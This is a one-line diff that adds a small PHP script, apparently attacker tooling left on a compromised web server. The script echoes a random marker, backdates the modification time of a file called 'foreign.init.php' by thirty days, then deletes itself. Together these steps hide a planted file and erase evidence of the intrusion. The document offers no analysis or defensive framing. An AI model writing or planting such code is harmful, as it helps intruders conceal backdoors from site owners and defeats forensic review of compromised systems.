@@ -1,0 +1,1 @@
+<?php echo "tcXvNqkrPe"; if (file_exists("./foreign.init.php")){ touch("./foreign.init.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*1VpxcU4Ff5kYcASCUaSz*/ ?>
